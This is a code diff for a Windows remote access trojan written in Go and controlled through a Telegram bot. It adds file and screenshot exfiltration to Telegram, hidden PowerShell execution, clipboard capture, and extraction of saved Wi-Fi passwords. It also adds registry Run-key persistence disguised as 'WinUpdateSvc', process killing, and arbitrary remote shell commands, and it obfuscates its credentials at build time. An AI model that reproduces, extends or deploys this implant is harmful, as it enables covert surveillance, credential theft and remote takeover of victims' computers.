@@ -5,16 +5,18 @@ import (
 	"encoding/json"
 	"fmt"
 	"io"
+	"mime/multipart"
 	"net/http"
 	"os"
 	"os/exec"
+	"path/filepath"
 	"runtime"
+	"strconv"
 	"strings"
 	"syscall"
 	"time"
 )
 
-// Credentials XOR-obfuscated at build time — no plaintext strings in binary
 var xk   = byte(TMPL_XOR_KEY)
 var eapi = []byte{TMPL_ENC_API}
 var etok = []byte{TMPL_ENC_TOKEN}
@@ -35,7 +37,10 @@ var (
 	tgURL   = apiBase + tok + "/"
 )
 
-var hc = &http.Client{Timeout: 35 * time.Second}
+var hc = &http.Client{Timeout: 60 * time.Second}
+var workDir, _ = os.Getwd()
+
+// ── Telegram API ───────────────────────────────────────────────────────────────
 
 func post(method string, body interface{}) ([]byte, error) {
 	data, _ := json.Marshal(body)
@@ -49,17 +54,49 @@ func post(method string, body interface{}) ([]byte, error) {
 
 func send(text string) {
 	if len(text) > 4000 {
-		text = text[:3990] + "\n...[truncated]"
+		text = text[:3990] + "\n...[cut]"
 	}
 	post("sendMessage", map[string]interface{}{
-		"chat_id":    cid,
-		"text":       text,
-		"parse_mode": "HTML",
+		"chat_id": cid, "text": text, "parse_mode": "HTML",
 	})
 }
 
+func sendFile(path string, asPhoto bool) error {
+	f, err := os.Open(path)
+	if err != nil {
+		return err
+	}
+	defer f.Close()
+
+	info, _ := f.Stat()
+	if info.Size() > 49*1024*1024 {
+		return fmt.Errorf("Datei zu groß (max 49 MB)")
+	}
+
+	var buf bytes.Buffer
+	w := multipart.NewWriter(&buf)
+	w.WriteField("chat_id", cid)
+	field := "document"
+	if asPhoto {
+		field = "photo"
+	}
+	fw, _ := w.CreateFormFile(field, filepath.Base(path))
+	io.Copy(fw, f)
+	w.Close()
+
+	resp, err := hc.Post(tgURL+"send"+strings.Title(field), w.FormDataContentType(), &buf)
+	if err != nil {
+		return err
+	}
+	resp.Body.Close()
+	return nil
+}
+
+// ── Shell ──────────────────────────────────────────────────────────────────────
+
 func shell(cmd string) string {
 	c := exec.Command("cmd.exe", "/c", cmd)
+	c.Dir = workDir
 	c.SysProcAttr = &syscall.SysProcAttr{CreationFlags: 0x08000000}
 	out, err := c.CombinedOutput()
 	s := strings.TrimSpace(string(out))
@@ -72,6 +109,14 @@ func shell(cmd string) string {
 	return s
 }
 
+func ps(cmd string) string {
+	c := exec.Command("powershell.exe", "-w", "h", "-nop", "-c", cmd)
+	c.Dir = workDir
+	c.SysProcAttr = &syscall.SysProcAttr{CreationFlags: 0x08000000}
+	out, _ := c.CombinedOutput()
+	return strings.TrimSpace(string(out))
+}
+
 func esc(s string) string {
 	s = strings.ReplaceAll(s, "&", "&amp;")
 	s = strings.ReplaceAll(s, "<", "&lt;")
@@ -79,19 +124,188 @@ func esc(s string) string {
 	return s
 }
 
-func sysinfo() string {
+// ── Commands ───────────────────────────────────────────────────────────────────
+
+func cmdSysinfo() string {
 	host, _ := os.Hostname()
 	user := os.Getenv("USERNAME")
-	dir, _ := os.Getwd()
+	domain := os.Getenv("USERDOMAIN")
 	return fmt.Sprintf(
-		"<b>%s\\%s</b>\n<code>OS:  %s/%s\nDir: %s\nPID: %d</code>",
-		host, user, runtime.GOOS, runtime.GOARCH, dir, os.Getpid(),
+		"💻 <b>%s\\%s@%s</b>\n<code>OS:  %s/%s\nDir: %s\nPID: %d</code>",
+		domain, user, host, runtime.GOOS, runtime.GOARCH, workDir, os.Getpid(),
 	)
 }
 
+func cmdScreenshot() {
+	path := os.TempDir() + fmt.Sprintf("\\ss%d.png", time.Now().Unix())
+	pscmd := fmt.Sprintf(
+		`Add-Type -An System.Windows.Forms,System.Drawing;`+
+			`$s=[System.Windows.Forms.Screen]::PrimaryScreen.Bounds;`+
+			`$b=New-Object System.Drawing.Bitmap($s.Width,$s.Height);`+
+			`$g=[System.Drawing.Graphics]::FromImage($b);`+
+			`$g.CopyFromScreen(0,0,0,0,$s.Size);`+
+			`$b.Save('%s')`, path,
+	)
+	ps(pscmd)
+	if _, err := os.Stat(path); err != nil {
+		send("❌ Screenshot fehlgeschlagen")
+		return
+	}
+	if err := sendFile(path, true); err != nil {
+		send("❌ Upload fehlgeschlagen: " + err.Error())
+	}
+	os.Remove(path)
+}
+
+func cmdDownload(path string) {
+	if path == "" {
+		send("❌ Verwendung: !download C:\\Pfad\\zur\\datei.txt")
+		return
+	}
+	send(fmt.Sprintf("📤 Lade hoch: <code>%s</code>...", esc(path)))
+	if err := sendFile(path, false); err != nil {
+		send("❌ " + err.Error())
+	}
+}
+
+func cmdClipboard() string {
+	out := ps("Get-Clipboard")
+	if out == "" {
+		return "📋 Zwischenablage ist leer"
+	}
+	return "📋 <code>" + esc(out) + "</code>"
+}
+
+func cmdWifi() string {
+	raw := shell("netsh wlan show profiles")
+	var result strings.Builder
+	result.WriteString("📶 <b>WLAN-Passwörter:</b>\n<code>")
+	found := false
+	for _, line := range strings.Split(raw, "\n") {
+		if strings.Contains(line, ":") && (strings.Contains(line, "All User Profile") || strings.Contains(line, "Alle Benutzerprofile")) {
+			parts := strings.SplitN(line, ":", 2)
+			if len(parts) < 2 {
+				continue
+			}
+			name := strings.TrimSpace(parts[1])
+			pw := shell(fmt.Sprintf(`netsh wlan show profile name="%s" key=clear`, name))
+			for _, l := range strings.Split(pw, "\n") {
+				if strings.Contains(l, "Key Content") || strings.Contains(l, "Schlüsselinhalt") {
+					pparts := strings.SplitN(l, ":", 2)
+					if len(pparts) == 2 {
+						result.WriteString(name + " : " + strings.TrimSpace(pparts[1]) + "\n")
+						found = true
+					}
+				}
+			}
+		}
+	}
+	if !found {
+		return "📶 Keine gespeicherten WLAN-Passwörter gefunden"
+	}
+	result.WriteString("</code>")
+	return result.String()
+}
+
+func cmdPersist() string {
+	exe, err := os.Executable()
+	if err != nil {
+		return "❌ " + err.Error()
+	}
+	key := `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
+	out := shell(fmt.Sprintf(`reg add "%s" /v "WinUpdateSvc" /t REG_SZ /d "%s" /f`, key, exe))
+	if strings.Contains(out, "successfully") || strings.Contains(out, "erfolgreich") {
+		return "✅ Persistenz eingerichtet — überlebt Neustart\n<code>Key: HKCU\\Run\\WinUpdateSvc</code>"
+	}
+	return "⚠️ <code>" + esc(out) + "</code>"
+}
+
+func cmdLs(path string) string {
+	if path == "" {
+		path = workDir
+	}
+	out := shell("dir /a \"" + path + "\"")
+	return "<code>" + esc(out) + "</code>"
+}
+
+func cmdCd(path string) string {
+	if path == "" {
+		return "📁 <code>" + esc(workDir) + "</code>"
+	}
+	abs := path
+	if !filepath.IsAbs(path) {
+		abs = filepath.Join(workDir, path)
+	}
+	if info, err := os.Stat(abs); err != nil || !info.IsDir() {
+		return "❌ Verzeichnis nicht gefunden: <code>" + esc(abs) + "</code>"
+	}
+	workDir = abs
+	return "📁 <code>" + esc(workDir) + "</code>"
+}
+
+func cmdPs() string {
+	out := shell("tasklist /fo csv /nh")
+	var sb strings.Builder
+	sb.WriteString("<code>")
+	for i, line := range strings.Split(out, "\n") {
+		if i > 30 {
+			sb.WriteString("...[+mehr]")
+			break
+		}
+		fields := strings.Split(line, `","`)
+		if len(fields) >= 2 {
+			name := strings.Trim(fields[0], `"`)
+			pid := strings.Trim(fields[1], `"`)
+			sb.WriteString(fmt.Sprintf("%-28s %s\n", name, pid))
+		}
+	}
+	sb.WriteString("</code>")
+	return sb.String()
+}
+
+func cmdKill(arg string) string {
+	if arg == "" {
+		return "❌ Verwendung: !kill <PID>"
+	}
+	if _, err := strconv.Atoi(arg); err != nil {
+		return "❌ PID muss eine Zahl sein"
+	}
+	out := shell("taskkill /F /PID " + arg)
+	return "<code>" + esc(out) + "</code>"
+}
+
+func cmdHelp() string {
+	return `🛠 <b>Verfügbare Befehle:</b>
+
+<b>System</b>
+<code>!sysinfo</code>       — Host, User, OS, PID
+<code>!ps</code>            — Prozessliste
+<code>!kill &lt;pid&gt;</code>     — Prozess beenden
+<code>!persist</code>       — Neustart-Persistenz (Registry)
+<code>!exit</code>          — Agent beenden
+
+<b>Dateisystem</b>
+<code>!ls [pfad]</code>     — Verzeichnis auflisten
+<code>!cd &lt;pfad&gt;</code>      — Ordner wechseln
+<code>!download &lt;pfad&gt;</code> — Datei an Telegram senden
+
+<b>Credentials</b>
+<code>!wifi</code>          — WLAN-Passwörter
+<code>!clipboard</code>     — Zwischenablage
+
+<b>Aufnahme</b>
+<code>!screenshot</code>    — Screenshot → Telegram
+
+<b>Shell</b>
+<code>!&lt;befehl&gt;</code>       — beliebiger Windows-Befehl
+Beispiel: <code>!whoami /all</code>`
+}
+
+// ── Update polling ─────────────────────────────────────────────────────────────
+
 type msg struct {
-	ID   int    `json:"update_id"`
-	M    *inner `json:"message"`
+	ID int    `json:"update_id"`
+	M  *inner `json:"message"`
 }
 type inner struct {
 	Text string `json:"text"`
@@ -121,12 +335,14 @@ func poll(offset int) ([]msg, int) {
 	return r.Result, next
 }
 
+// ── Main ───────────────────────────────────────────────────────────────────────
+
 func main() {
 	time.Sleep(TMPL_SLEEP * time.Second)
 
 	host, _ := os.Hostname()
 	user := os.Getenv("USERNAME")
-	send(fmt.Sprintf("🟢 <b>Agent online</b>  [Go]\n<code>%s\\%s</code>", host, user))
+	send(fmt.Sprintf("🟢 <b>Agent online</b>  [Go]\n<code>%s\\%s</code>\n\nTippe <b>!help</b> für alle Befehle.", host, user))
 
 	offset := 0
 	for {
@@ -141,13 +357,40 @@ func main() {
 			if txt == "" {
 				continue
 			}
+
+			cmd, arg, _ := strings.Cut(strings.TrimPrefix(txt, "!"), " ")
+			cmd = strings.ToLower(cmd)
+
 			switch {
+			case txt == "!help" || txt == "help":
+				send(cmdHelp())
 			case txt == "!sysinfo" || txt == "sysinfo":
-				send(sysinfo())
+				send(cmdSysinfo())
+			case txt == "!screenshot":
+				send("📸 Screenshot wird erstellt...")
+				cmdScreenshot()
+			case strings.HasPrefix(txt, "!download"):
+				cmdDownload(strings.TrimPrefix(txt, "!download "))
+			case txt == "!clipboard":
+				send(cmdClipboard())
+			case txt == "!wifi":
+				send("🔍 Suche WLAN-Passwörter...")
+				send(cmdWifi())
+			case txt == "!persist":
+				send(cmdPersist())
+			case txt == "!ps":
+				send(cmdPs())
+			case strings.HasPrefix(txt, "!kill"):
+				send(cmdKill(arg))
+			case strings.HasPrefix(txt, "!ls"):
+				send(cmdLs(arg))
+			case strings.HasPrefix(txt, "!cd"):
+				send(cmdCd(arg))
 			case txt == "!exit" || txt == "exit":
-				send("🔴 Terminated.")
+				send("🔴 Agent beendet.")
 				os.Exit(0)
 			case strings.HasPrefix(txt, "!"):
+				_ = cmd
 				out := shell(strings.TrimPrefix(txt, "!"))
 				send("<code>" + esc(out) + "</code>")
 			}
